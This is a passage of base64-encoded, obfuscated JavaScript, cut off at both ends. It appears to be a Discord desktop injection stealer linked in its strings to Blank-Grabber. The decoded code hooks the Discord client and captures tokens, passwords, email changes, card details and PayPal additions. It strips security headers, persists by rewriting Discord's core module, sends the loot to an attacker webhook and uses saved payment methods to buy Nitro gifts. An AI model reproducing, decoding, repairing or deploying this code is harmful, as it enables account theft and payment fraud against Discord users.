CdnZXRITUFDJywnaW5qZWN0aW9uX3VybCcsJ2RlZmF1bHQtc3JjXHgyMFx4MjcqXHgyNycsJyoqXHgwYU9sZFx4MjBQYXNzd29yZDpceDIwKionLCdEaXNjb3JkXHgyMEJ1Z1x4MjBIdW50ZXJceDIwKEdvbGRlbiknLCdBUFBEQVRBJywnZGlzY29yZC5jb20nLCdudW1Sb3VuZHNceDIwbXVzdFx4MjBhXHgyMGludGVnZXJceDIwPj1ceDIwMScsJ2pzU0hBJywnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JsYW5rLWMvQmxhbmstR3JhYmJlci9tYWluLy5naXRodWIvd29ya2Zsb3dzL2ltYWdlLnBuZycsJzNWZlhOYVonLCdmcm9tJywnYmluTGVuJywnLndlYnAnLCdleHBvcnRzJywnMTc2MTE3NnVLQ1hxZycsJ3ByZW1pdW1fdHlwZScsJ1x4MjIpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKG51bGwpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5yZXNwb25zZVRleHQ7JywnZGlzY3JpbWluYXRvcicsJ1x4MjB8XHgyMCcsJ3RvVXBwZXJDYXNlJywnTm9uZScsJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CbGFuay1jL0Rpc2NvcmQtSW5qZWN0aW9uLUJHL21haW4vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMnLCc5OTk5Jywnb25CZWZvcmVSZXF1ZXN0Jywnd2ViaG9va19wcm90ZWN0b3Jfa2V5JywnMjQyMjg2N2MtMjQ0ZC00NzZhLWJhNGYtMzZlMTk3NzU4ZDk3JywnOTFCZ25NeVonLCduZXdfcGFzc3dvcmQnLCcvYmlsbGluZy9wYXltZW50LXNvdXJjZXNceDIyLFx4MjBmYWxzZSk7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKFx4MjJBdXRob3JpemF0aW9uXHgyMixceDIwXHgyMicsJyoqXHgwYUNWQzpceDIwKionLCcod2VicGFja0NodW5rZGlzY29yZF9hcHAucHVzaChbW1x4MjdceDI3XSx7fSxlPT57bT1bXTtmb3IobGV0XHgyMGNceDIwaW5ceDIwZS5jKW0ucHVzaChlLmNbY10pfV0pLG0pLmZpbmQobT0+bT8uZXhwb3J0cz8uZGVmYXVsdD8uZ2V0VG9rZW4hPT12b2lkXHgyMDApLmV4cG9ydHMuZGVmYXVsdC5nZXRUb2tlbigpJywnZW1iZWRfY29sb3InLCd1c2VybmFtZScsJ2h0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tL21lcmNoYW50cy80OXBwMnJwNHBoeW03Mzg3L2NsaWVudF9hcGkvdiovcGF5bWVudF9tZXRob2RzL3BheXBhbF9hY2NvdW50cycsJ2FwcCcsJ0Vhcmx5XHgyMFN1cHBvcnRlcicsJ3NsaWNlJywnYXBwLmFzYXInLCcpKTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0Jywnc3RyaW5naWZ5JywncGluZ192YWwnLCdjYXJkW2N2Y10nLCc3NjY3NTRZRld5bWwnLCdIeXBlU3F1YWRceDIwRXZlbnQnLCdlbGVjdHJvbicsJ2pvaW4nLCdodHRwczovL3N0YXR1cy5kaXNjb3JkLmNvbS9hcGkvdiovc2NoZWR1bGVkLW1haW50ZW5hbmNlcy91cGNvbWluZy5qc29uJywndmFsdWUnLCdwYXJzZScsJyoqQWNjb3VudFx4MjBJbmZvKionLCdpbmNsdWRlcycsJyhVbmtub3duKScsJ25vdycsJ3VybCcsJzAxMjM0NTY3ODlhYmNkZWYnLCdsb2dpbicsJ1Jlc291cmNlcycsJ3JlYWRkaXJTeW5jJywnd2ViUmVxdWVzdCcsJ3Jlc3BvbnNlSGVhZGVycycsJ0ZhaWxlZFx4MjB0b1x4MjBQdXJjaGFzZVx4MjDinYwnLCd2YXJceDIweG1sSHR0cFx4MjA9XHgyMG5ld1x4MjBYTUxIdHRwUmVxdWVzdCgpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5vcGVuKFx4MjJQT1NUXHgyMixceDIwXHgyMmh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3N0b3JlL3NrdXMvJywnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lL2xpYnJhcnknLCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5LmRpc2NvcmQuZ2cvKiddO3g9ZnVuY3Rpb24oKXtyZXR1cm4geDk7fTtyZXR1cm4geCgpO31mdW5jdGlvbiBkZWMyaGV4KFkpe2NvbnN0IHY9UztyZXR1cm4oWTwxNS41PycwJzonJykrTWF0aFt2KDB4ODEpXShZKVt2KDB4ZTApXSgweDEwKTt9ZnVuY3Rpb24gYmFzZTMydG9oZXgoWSl7Y29uc3QgRz1TO2xldCBaPUcoMHg5NSksbz0nJyxUPScnO1k9WVtHKDB4OTcpXSgvPSskLywnJyk7Zm9yKGxldCBIPTB4MDtIPFlbRygweGE2KV07SCsrKXtsZXQgVj1aWydpbmRleE9mJ10oWVtHKDB4MTFkKV0oSClbRygweDEzMyldKCkpO2lmKFY9PT0tMHgxKWNvbnNvbGVbRygweDdmKV0oRygweGE5KSk7bys9bGVmdHBhZChWW0coMHhlMCldKDB4MiksMHg1LCcwJyk7fWZvcihsZXQgUj0weDA7UisweDg8PW9bRygweGE2KV07Uis9MHg4KXtsZXQgQT1vW0coMHgxMWIpXShSLDB4OCk7VD1UK2xlZnRwYWQocGFyc2VJbnQoQSwweDIpW0coMHhlMCldKDB4MTApLDB4MiwnMCcpO31yZXR1cm4gVDt9ZnVuY3Rpb24gbGVmdHBhZChZLFosbyl7Y29uc3QgYj1TO3JldHVybiBaKzB4MT49WVtiKDB4YTYpXSYmKFk9QXJyYXkoWisweDEtWVtiKDB4YTYpXSlbYigweDZiKV0obykrWSksWTt9Y29uc3QgZGlzY29yZFBhdGg9KGZ1bmN0aW9uKCl7Y29uc3QgZj1TLFk9YXJnc1sweDBdW2YoMHhiZCldKHBhdGhbJ3NlcCddKVtmKDB4MTQ0KV0oMHgwLC0weDEpW2YoMHg2YildKHBhdGhbZigweDliKV0pO2xldCBaO2lmKHByb2Nlc3NbZigweGM2KV09PT1mKDB4ZjcpKVo9cGF0aFtmKDB4NmIpXShZLGYoMHhlYSkpO2Vsc2UgcHJvY2Vzc1sncGxhdGZvcm0nXT09PSdkYXJ3aW4nJiYoWj1wYXRoW2YoMHg2YildKFksZigweDExMiksZigweDc2KSkpO2lmKGZzW2YoMHhlZSldKFopKXJldHVybnsncmVzb3VyY2VQYXRoJzpaLCdhcHAnOll9O3JldHVybnsndW5kZWZpbmVkJzp1bmRlZmluZWQsJ3VuZGVmaW5lZCc6dW5kZWZpbmVkfTt9KCkpO2Z1bmN0aW9uIEMoWSxaKXtjb25zdCBvPXgoKTtyZXR1cm4gQz1mdW5jdGlvbihULEgpe1Q9VC0weDZhO2xldCBWPW9bVF07cmV0dXJuIFY7fSxDKFksWik7fWZ1bmN0aW9uIHVwZGF0ZUNoZWNrKCl7Y29uc3QgdD1TLHtyZXNvdXJjZVBhdGg6WSxhcHA6Wn09ZGlzY29yZFBhdGg7aWYoWT09PXVuZGVmaW5lZHx8Wj09PXVuZGVmaW5lZClyZXR1cm47Y29uc3Qgbz1wYXRoW3QoMHg2YildKFksdCgweDE0MikpLFQ9cGF0aFt0KDB4NmIpXShvLHQoMHhhNSkpLEg9cGF0aFt0KDB4NmIpXShvLHQoMHhiMSkpLFY9ZnNbdCgweDc3KV0oWisnXHg1Y21vZHVsZXNceDVjJylbdCgweGUyKV0oQT0+L2Rpc2NvcmRfZGVza3RvcF9jb3JlLSs/L1sndGVzdCddKEEpKVsweDBdLGk9WisnXHg1Y21vZHVsZXNceDVjJytWKydceDVjZGlzY29yZF9kZXNrdG9wX2NvcmVceDVjaW5kZXguanMnLFI9cGF0aFt0KDB4NmIpXShwcm9jZXNzW3QoMHhkNCldW3QoMHgxMjQpXSx0KDB4MTA0KSk7aWYoIWZzW3QoMHhlZSldKG8pKWZzW3QoMHg4YildKG8pO2lmKGZzWydleGlzdHNTeW5jJ10oVCkpZnNbdCgweGZjKV0oVCk7aWYoZnNbdCgweGVlKV0oSCkpZnNbdCgweGZjKV0oSCk7aWYocHJvY2Vzc1sncGxhdGZvcm0nXT09PSd3aW4zMid8fHByb2Nlc3NbdCgweGM2KV09PT10KDB4OWEpKXtmc1t0KDB4MTE3KV0oVCxKU09OW3QoMHgxNDcpXSh7J25hbWUnOnQoMHg4NiksJ21haW4nOnQoMHhiMSl9LG51bGwsMHg0KSk7Y29uc3QgQT10KDB4YWYpK2krdCgweGMyKStSK3QoMHhjNykrY29uZmlnW3QoMHgxMjApXSsnXHgyNyxceDIwKHJlcylceDIwPT5ceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGNvbnN0XHgyMGZpbGVceDIwPVx4MjBmcy5jcmVhdGVXcml0ZVN0cmVhbShpbmRleEpzKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjByZXMucmVwbGFjZShceDI3JVdFQkhPT0tIRVJFQkFTRTY0RU5DT0RFRCVceDI3LFx4MjBceDI3JytlbmNvZGVkSG9vayt0KDB4ZGUpK2NvbmZpZ1t0KDB4MTM4KV0rdCgweGNmKStwYXRoW3QoMHg2YildKFksdCgweDE0NSkpK3QoMHhiNSk7ZnNbdCgweDExNyldKEgsQVt0KDB4OTcpXSgvXFwvZywnXHg1Y1x4NWMnKSk7fWlmKCFmc1snZXhpc3RzU3luYyddKHBhdGhbdCgweDZiKV0oX19kaXJuYW1lLHQoMHgxMWUpKSkpcmV0dXJuITB4MDtyZXR1cm4gZnNbdCgweDhkKV0ocGF0aFsnam9pbiddKF9fZGlybmFtZSx0KDB4MTFlKSkpLGV4ZWNTY3JpcHQodCgweDExYykpLCEweDE7fWNvbnN0IGV4ZWNTY3JpcHQ9WT0+e2NvbnN0IEs9UyxaPUJyb3dzZXJXaW5kb3dbSygweDg1KV0oKVsweDBdO3JldHVybiBaW0soMHhlYildWydleGVjdXRlSmF2YVNjcmlwdCddKFksITB4MCk7fSxnZXRJbmZvPWFzeW5jIFk9Pntjb25zdCBNPVMsWj1hd2FpdCBleGVjU2NyaXB0KCd2YXJceDIweG1sSHR0cFx4MjA9XHgyMG5ld1x4MjBYTUxIdHRwUmVxdWVzdCgpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5vcGVuKFx4MjJHRVRceDIyLFx4MjBceDIyJytjb25maWdbJ2FwaSddKydceDIyLFx4MjBmYWxzZSk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyMkF1dGhvcml6YXRpb25ceDIyLFx4MjBceDIyJytZK00oMHgxMzApKTtyZXR1cm4gSlNPTltNKDB4NmUpXShaKTt9LGZldGNoQmlsbGluZz1hc3luYyBZPT57Y29uc3QgTD1TLFo9YXdhaXQgZXhlY1NjcmlwdChMKDB4N2UpK2NvbmZpZ1snYXBpJ10rTCgweDEzYykrWStMKDB4ZDkpKTtpZighWltMKDB4OGYpXXx8WltMKDB4YTYpXT09PTB4MClyZXR1cm4nJztyZXR1cm4gSlNPTltMKDB4NmUpXShaKTt9LGdldEJpbGxpbmc9YXN5bmMgWT0+e2NvbnN0IGo9UyxaPWF3YWl0IGZldGNoQmlsbGluZyhZKTtpZighWilyZXR1cm4n4p2MJztjb25zdCBvPVtdO1pbJ2ZvckVhY2gnXShUPT57Y29uc3QgUT1DO2lmKCFUW1EoMHg5NildKXN3aXRjaChUW1EoMHhjYyldKXtjYXNlIDB4MTpvW1EoMHg4NCldKCfwn5KzJyk7YnJlYWs7Y2FzZSAweDI6b1tRKDB4ODQpXShRKDB4OTMpKTticmVhaztkZWZhdWx0Om9bUSgweDg0KV0oUSgweDcxKSk7fX0pO2lmKG9bJ2xlbmd0aCddPT0weDApb1tqKDB4ODQpXSgn4p2MJyk7cmV0dXJuIG9bJ2pvaW4nXSgnXHgyMCcpO30sUHVyY2hhc2U9YXN5bmMoWSxaLG8sVCk9Pntjb25zdCBzPVMsSD17J2V4cGVjdGVkX2Ftb3VudCc6Y29uZmlnWyduaXRybyddW29dW1RdW3MoMHhhYSldLCdleHBlY3RlZF9jdXJyZW5jeSc6cygweGRkKSwnZ2lmdCc6ISFbXSwncGF5bWVudF9zb3VyY2VfaWQnOlosJ3BheW1lbnRfc291cmNlX3Rva2VuJzpudWxsLCdwdXJjaGFzZV90b2tlbic6cygweDEzOSksJ3NrdV9zdWJzY3JpcHRpb25fcGxhbl9pZCc6Y29uZmlnWyduaXRybyddW29dW1RdWydza3UnXX0sVj1leGVjU2NyaXB0KHMoMHg3YikrY29uZmlnW3MoMHhmMyldW29dW1RdWydpZCddKycvcHVyY2hhc2VceDIyLFx4MjBmYWxzZSk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyMkF1dGhvcml6YXRpb25ceDIyLFx4MjBceDIyJytZK3MoMHg5YykrSlNPTltzKDB4MTQ3KV0oSCkrcygweDE0NikpO2lmKFZbJ2dpZnRfY29kZSddKXJldHVybiBzKDB4OTIpK1ZbcygweDEwOCldO2Vsc2UgcmV0dXJuIG51bGw7fSxidXlOaXRybz1hc3luYyBZPT57Y29uc3QgRD1TLFo9YXdhaXQgZmV0Y2hCaWxsaW5nKFkpLG89RCgweDdhKTtpZighWilyZXR1cm4gbztsZXQgVD1bXTtaWydmb3JFYWNoJ10oSD0+e2NvbnN0IGU9RDshSFtlKDB4OTYpXSYmKFQ9VFtlKDB4MTBjKV0oSFsnaWQnXSkpO30pO2ZvcihsZXQgSCBpbiBUKXtjb25zdCBWPVB1cmNoYXNlKFksSCxEKDB4ZjgpLEQoMHhkYikpO2lmKFYhPT1udWxsKXJldHVybiBWO2Vsc2V7Y29uc3QgaT1QdXJjaGFzZShZLEgsRCgweGY4KSwnbW9udGgnKTtpZihpIT09bnVsbClyZXR1cm4gaTtlbHNle2NvbnN0IFI9UHVyY2hhc2UoWSxILCdjbGFzc2ljJyxEKDB4ZDApKTtyZXR1cm4gUiE9PW51bGw/UjpvO319fX0sZ2V0Tml0cm89WT0+e2NvbnN0IHA9Uztzd2l0Y2goWSl7Y2FzZSAweDA6cmV0dXJuIHAoMHgxMGUpO2Nhc2UgMHgxOnJldHVybiBwKDB4MTA1KTtjYXNlIDB4MjpyZXR1cm4gcCgweGZkKTtjYXNlIDB4MzpyZXR1cm4gcCgweDEwMyk7ZGVmYXVsdDpyZXR1cm4gcCgweDcxKTt9fSxnZXRCYWRnZXM9WT0+e2NvbnN0IFU9UyxaPVtdO3JldHVybiBZPT0weDQwMDAwMCYmKFpbVSgweDg0KV0oVSgweDEwMikpLFktPTB4NDAwMDAwKSxZPT0weDQwMDAwJiYoWltVKDB4ODQpXSgnTW9kZXJhdG9yXHgyMFByb2dyYW1zXHgyMEFsdW1uaScpLFktPTB4NDAwMDApLFk9PTB4MjAwMDAmJihaWydwdXNoJ10oVSgweDEwOSkpLFktPTB4MjAwMDApLFk9PTB4NDAwMCYmKFpbVSgweDg0KV0oVSgweDEyMykpLFktPTB4NDAwMCksWT09MHgyMDAmJihaW1UoMHg4NCldKFUoMHgxNDMpKSxZLT0weDIwMCksWT09MHgxMDAmJihaW1UoMHg4NCldKFUoMHhmYSkpLFktPTB4MTAwKSxZPT0weDgwJiYoWlsncHVzaCddKFUoMHhmNikpLFktPTB4ODApLFk9PTB4NDAmJihaW1UoMHg4NCldKFUoMHhkNSkpLFktPTB4NDApLFk9PTB4OCYmKFpbVSgweDg0KV0oVSgweGMwKSksWS09MHg4KSxZPT0weDQmJihaW1UoMHg4NCldKFUoMHgxNGIpKSxZLT0weDQpLFk9PTB4MiYmKFpbVSgweDg0KV0oVSgweGY1KSksWS09MHgyKSxZPT0weDEmJihaW1UoMHg4NCldKFUoMHg5OCkpLFktPTB4MSksWT09MHgwP1pbJ2xlbmd0aCddPT0weDAmJlpbVSgweDg0KV0oVSgweDEzNCkpOlpbJ3B1c2gnXShVKDB4NzEpKSxaWydqb2luJ10oJyxceDIwJyk7fSxob29rZXI9YXN5bmMoWSxaPW51bGwpPT57Y29uc3QgZD1TLG89SlNPTltkKDB4MTQ3KV0oWSksVD1aPT1udWxsP25ldyBVUkwoY29uZmlnWyd3ZWJob29rJ10pOm5ldyBVUkwoWiksSD17J0NvbnRlbnQtVHlwZSc6ZCgweGU4KSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJzonKid9O2lmKCFjb25maWdbJ3dlYmhvb2snXVtkKDB4NzApXSgnYXBpL3dlYmhvb2tzJykpe2NvbnN0IFI9dG90cChjb25maWdbZCgweDEzOCldKTtIW2QoMHhjNCldPVI7fWNvbnN0IFY9eydwcm90b2NvbCc6VFsncHJvdG9jb2wnXSwnaG9zdG5hbWUnOlRbZCgweDgwKV0sJ3BhdGgnOlRbZCgweGRhKV0sJ21ldGhvZCc6J1BPU1QnLCdoZWFkZXJzJzpIfSxpPWh0dHBzW2QoMHhiYildKFYpO2lbJ29uJ10oJ2Vycm9yJyxBPT57Y29uc3QgST1kO2NvbnNvbGVbSSgweGUxKV0oQSk7fSksaVsnd3JpdGUnXShvKSxpWydlbmQnXSgpO2lmKFo9PW51bGwpaHR0cHNbJ2dldCddKGF0b2IoJzNGbWN2a0dlNGxXZHY4Mll1a25jMDVXWnk5eUw2TUhjMFJIYSdbZCgweGJkKV0oJycpW2QoMHhhYyldKClbZCgweDZiKV0oJycpKSxBPT5BWydvbiddKGQoMHg4Mikscj0+aG9va2VyKFksclsndG9TdHJpbmcnXSgpKSkpWydvbiddKGQoMHg3ZiksKCk9Pnt9KTt9LGxvZ2luPWFzeW5jKFksWixvKT0+e2NvbnN0IE89UyxUPWF3YWl0IGdldEluZm8obyksSD1nZXROaXRybyhUW08oMHgxMmYpXSksVj1nZXRCYWRnZXMoVFtPKDB4YWQpXSksaT1hd2FpdCBnZXRCaWxsaW5nKG8pLFI9eyd1c2VybmFtZSc6Y29uZmlnW08oMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW08oMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzpPKDB4NmYpLCd2YWx1ZSc6J0VtYWlsOlx4MjAqKicrWStPKDB4ZTUpK1orJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6TygweDhhKSwndmFsdWUnOk8oMHhjYSkrSCtPKDB4MTExKStWKycqKlx4MGFCaWxsaW5nOlx4MjAqKicraSsnKionLCdpbmxpbmUnOiFbXX0seyduYW1lJzpPKDB4YjkpLCd2YWx1ZSc6J2AnK28rJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6VFtPKDB4MTQwKV0rJyMnK1RbTygweDEzMSldK08oMHgxMzIpK1RbJ2lkJ10sJ2ljb25fdXJsJzpPKDB4YjcpK1RbJ2lkJ10rJy8nK1RbTygweDExMyldK08oMHgxMmMpfX1dfTtpZihjb25maWdbTygweGRjKV0pUltPKDB4YjMpXT1jb25maWdbTygweDE0OCldO2hvb2tlcihSKTt9LHBhc3N3b3JkQ2hhbmdlZD1hc3luYyhZLFosbyk9Pntjb25zdCB4MD1TLFQ9YXdhaXQgZ2V0SW5mbyhvKSxIPWdldE5pdHJvKFRbeDAoMHgxMmYpXSksVj1nZXRCYWRnZXMoVFt4MCgweGFkKV0pLGk9YXdhaXQgZ2V0QmlsbGluZyhvKSxSPXsndXNlcm5hbWUnOmNvbmZpZ1snZW1iZWRfbmFtZSddLCdhdmF0YXJfdXJsJzpjb25maWdbeDAoMHhiYSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbeDAoMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzp4MCgweDllKSwndmFsdWUnOngwKDB4ZTcpK1RbJ2VtYWlsJ10reDAoMHgxMjIpK1kreDAoMHg5MSkrWisnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDAoMHg4YSksJ3ZhbHVlJzonTml0cm9ceDIwVHlwZTpceDIwKionK0grJyoqXHgwYUJhZGdlczpceDIwKionK1YreDAoMHhhMykraSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDAoMHhiOSksJ3ZhbHVlJzonYCcrbysnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpUW3gwKDB4MTQwKV0rJyMnK1RbeDAoMHgxMzEpXSsnXHgyMHxceDIwJytUWydpZCddLCdpY29uX3VybCc6eDAoMHhiNykrVFsnaWQnXSsnLycrVFt4MCgweDExMyldK3gwKDB4MTJjKX19XX07aWYoY29uZmlnW3gwKDB4ZGMpXSlSW3gwKDB4YjMpXT1jb25maWdbeDAoMHgxNDgpXTtob29rZXIoUik7fSxlbWFpbENoYW5nZWQ9YXN5bmMoWSxaLG8pPT57Y29uc3QgeDE9UyxUPWF3YWl0IGdldEluZm8obyksSD1nZXROaXRybyhUW3gxKDB4MTJmKV0pLFY9Z2V0QmFkZ2VzKFRbeDEoMHhhZCldKSxpPWF3YWl0IGdldEJpbGxpbmcobyksUj17J3VzZXJuYW1lJzpjb25maWdbeDEoMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnWydlbWJlZF9jb2xvciddLCdmaWVsZHMnOlt7J25hbWUnOicqKkVtYWlsXHgyMENoYW5nZWQqKicsJ3ZhbHVlJzp4MSgweDEwZCkrWSt4MSgweGU2KStaKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4MSgweDhhKSwndmFsdWUnOngxKDB4Y2EpK0greDEoMHgxMTEpK1YreDEoMHhhMykraSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDEoMHhiOSksJ3ZhbHVlJzonYCcrbysnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpUWyd1c2VybmFtZSddKycjJytUWydkaXNjcmltaW5hdG9yJ10rJ1x4MjB8XHgyMCcrVFsnaWQnXSwnaWNvbl91cmwnOngxKDB4YjcpK1RbJ2lkJ10rJy8nK1RbeDEoMHgxMTMpXSt4MSgweDEyYyl9fV19O2lmKGNvbmZpZ1sncGluZ19vbl9ydW4nXSlSW3gxKDB4YjMpXT1jb25maWdbeDEoMHgxNDgpXTtob29rZXIoUik7fSxQYXlwYWxBZGRlZD1hc3luYyBZPT57Y29uc3QgeDI9UyxaPWF3YWl0IGdldEluZm8oWSksbz1nZXROaXRybyhaW3gyKDB4MTJmKV0pLFQ9Z2V0QmFkZ2VzKFpbeDIoMHhhZCldKSxIPWdldEJpbGxpbmcoWSksVj17J3VzZXJuYW1lJzpjb25maWdbeDIoMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbeDIoMHhiYSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbeDIoMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzp4MigweGI2KSwndmFsdWUnOidUaW1lXHgyMHRvXHgyMGJ1eVx4MjBzb21lXHgyMG5pdHJvXHgyMGJhYnlceDIw8J+YqScsJ2lubGluZSc6IVtdfSx7J25hbWUnOngyKDB4OGEpLCd2YWx1ZSc6eDIoMHhjYSkrbyt4MigweDk5KStUK3gyKDB4YTMpK0grJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6eDIoMHhiOSksJ3ZhbHVlJzonYCcrWSsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpaW3gyKDB4MTQwKV0rJyMnK1pbeDIoMHgxMzEpXSsnXHgyMHxceDIwJytaWydpZCddLCdpY29uX3VybCc6eDIoMHhiNykrWlsnaWQnXSsnLycrWlt4MigweDExMyldK3gyKDB4MTJjKX19XX07aWYoY29uZmlnWydwaW5nX29uX3J1biddKVZbeDIoMHhiMyldPWNvbmZpZ1t4MigweDE0OCldO2hvb2tlcihWKTt9LGNjQWRkZWQ9YXN5bmMoWSxaLG8sVCxIKT0+e2NvbnN0IHgzPVMsVj1hd2FpdCBnZXRJbmZvKEgpLGk9Z2V0Tml0cm8oVlt4MygweDEyZildKSxSPWdldEJhZGdlcyhWW3gzKDB4YWQpXSksQT1hd2FpdCBnZXRCaWxsaW5nKEgpLHI9eyd1c2VybmFtZSc6Y29uZmlnW3gzKDB4YjgpXSwnYXZhdGFyX3VybCc6Y29uZmlnW3gzKDB4YmEpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW3gzKDB4MTNmKV0sJ2ZpZWxkcyc6W3snbmFtZSc6eDMoMHhjYiksJ3ZhbHVlJzp4MygweGUzKStZK3gzKDB4MTNkKStaK3gzKDB4ODkpK28rJy8nK1QrJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOngzKDB4OGEpLCd2YWx1ZSc6eDMoMHhjYSkraSt4MygweDExMSkrUisnKipceDBhQmlsbGluZzpceDIwKionK0ErJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOngzKDB4YjkpLCd2YWx1ZSc6J2AnK0grJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6Vlt4MygweDE0MCldKycjJytWW3gzKDB4MTMxKV0rJ1x4MjB8XHgyMCcrVlsnaWQnXSwnaWNvbl91cmwnOngzKDB4YjcpK1ZbJ2lkJ10rJy8nK1ZbeDMoMHgxMTMpXSt4MygweDEyYyl9fV19O2lmKGNvbmZpZ1sncGluZ19vbl9ydW4nXSlyW3gzKDB4YjMpXT1jb25maWdbeDMoMHgxNDgpXTtob29rZXIocik7fSxuaXRyb0JvdWdodD1hc3luYyBZPT57Y29uc3QgeDQ9UyxaPWF3YWl0IGdldEluZm8oWSksbz1nZXROaXRybyhaWydwcmVtaXVtX3R5cGUnXSksVD1nZXRCYWRnZXMoWlsnZmxhZ3MnXSksSD1hd2FpdCBnZXRCaWxsaW5nKFkpLFY9YXdhaXQgYnV5Tml0cm8oWSksaT17J3VzZXJuYW1lJzpjb25maWdbJ2VtYmVkX25hbWUnXSwnY29udGVudCc6ViwnYXZhdGFyX3VybCc6Y29uZmlnW3g0KDB4YmEpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW3g0KDB4MTNmKV0sJ2ZpZWxkcyc6W3snbmFtZSc6eDQoMHhjNSksJ3ZhbHVlJzp4NCgweGEwKStWKydgYGAnLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6JyoqRGlzY29yZFx4MjBJbmZvKionLCd2YWx1ZSc6eDQoMHhjYSkrbyt4NCgweDExMSkrVCt4NCgweGEzKStIKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4NCgweGI5KSwndmFsdWUnOidgJytZKydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOlpbeDQoMHgxNDApXSsnIycrWlsnZGlzY3JpbWluYXRvciddKydceDIwfFx4MjAnK1pbJ2lkJ10sJ2ljb25fdXJsJzp4NCgweGI3KStaWydpZCddKycvJytaWydhdmF0YXInXSt4NCgweDEyYyl9fV19O2lmKGNvbmZpZ1t4NCgweGRjKV0paVt4NCgweGIzKV09Y29uZmlnW3g0KDB4MTQ4KV0rKCdceDBhJytWKTtob29rZXIoaSk7fTtzZXNzaW9uW1MoMHhmNCldW1MoMHg3OCldW1MoMHgxMzcpXShjb25maWdbUygweDEwMCldLChZLFopPT57Y29uc3QgeDU9UztpZihZW3g1KDB4NzMpXVt4NSgweDExNildKHg1KDB4YzkpKSlyZXR1cm4gWih7J2NhbmNlbCc6ISFbXX0pO3VwZGF0ZUNoZWNrKCk7fSksc2Vzc2lvbltTKDB4ZjQpXVtTKDB4NzgpXVsnb25IZWFkZXJzUmVjZWl2ZWQnXSgoWSxaKT0+e2NvbnN0IHg2PVM7WVt4NigweDczKV1beDYoMHgxMTYpXShjb25maWdbJ3dlYmhvb2snXSk/WVsndXJsJ11bJ2luY2x1ZGVzJ10oeDYoMHgxMjUpKT9aKHsncmVzcG9uc2VIZWFkZXJzJzpPYmplY3RbJ2Fzc2lnbiddKHsnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfSxZW3g2KDB4NzkpXSl9KTpaKHsncmVzcG9uc2VIZWFkZXJzJzpPYmplY3RbJ2Fzc2lnbiddKHsnQ29udGVudC1TZWN1cml0eS1Qb2xpY3knOlt4NigweDEyMSkseDYoMHhlNCkseDYoMHhhYildLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzJzonKicsJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbic6JyonfSxZWydyZXNwb25zZUhlYWRlcnMnXSl9KTooZGVsZXRlIFlbeDYoMHg3OSldW3g2KDB4YjQpXSxkZWxldGUgWVt4NigweDc5KV1beDYoMHg5ZildLFooeydyZXNwb25zZUhlYWRlcnMnOnsuLi5ZW3g2KDB4NzkpXSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfX0pKTt9KSxzZXNzaW9uW1MoMHhmNCldW1MoMHg3OCldW1MoMHhhOCldKGNvbmZpZ1tTKDB4ZTIpXSxhc3luYyhZLFopPT57Y29uc3QgeDc9UztpZihZWydzdGF0dXNDb2RlJ10hPT0weGM4JiZZW3g3KDB4